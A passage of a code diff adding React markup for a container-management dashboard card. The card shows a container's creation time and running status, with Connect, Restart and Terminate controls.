+                        <span className="text-[8px] uppercase tracking-widest opacity-40 block">Created</span>
+                        <p className="text-[10px] font-mono">{new Date(container.created_at).toLocaleTimeString()}</p>
+                      </div>
+                      <div className="space-y-1">
+                        <span className="text-[8px] uppercase tracking-widest opacity-40 block">Status</span>
+                        <p className={`text-[10px] font-mono uppercase ${container.status === 'running' ? 'text-emerald-600' : 'text-red-600'}`}>{container.status}</p>
+                      </div>
+                    </div>
+
+                    <div className="flex items-center gap-2">
+                      <a 
+                        href={container.remote_url}
+                        target="_blank"
+                        rel="noopener noreferrer"
+                        className="px-4 py-2 bg-[#141414] text-white text-[10px] uppercase tracking-widest flex items-center gap-2 hover:bg-opacity-80 transition-all"
+                      >
+                        <ExternalLink className="w-3 h-3" /> Connect
+                      </a>
+                      <button 
+                        onClick={() => handleRestartContainer(container.id)}
+                        className="p-2 border border-[#141414] border-opacity-20 hover:bg-gray-100 transition-all"
+                        title="Restart Container"
+                      >
+                        <RefreshCw className="w-3 h-3" />
+                      </button>
+                      <button 
+                        onClick={() => handleTerminateContainer(container.id)}
+                        className="p-2 border border-red-500 border-opacity-20 text-red-500 hover:bg-red-50 transition-all"
+                        title="Terminate Container"
+                      >
+                        <Trash2 className="w-3 h-3" />
+                      </button>
+                    </div>
+                  </motion.div>
+                ))
+              )}
+            </div>
+          </div>
+        </div>
+      )}
+    </div>
+  </main>
 
       {/* Footer */}
       <footer className="fixed bottom-0 left-0 right-0 border-t border-[#141414] p-4 flex justify-between items-center text-[9px] uppercase tracking-[0.2em] opacity-40 bg-[#E4E3E0]">
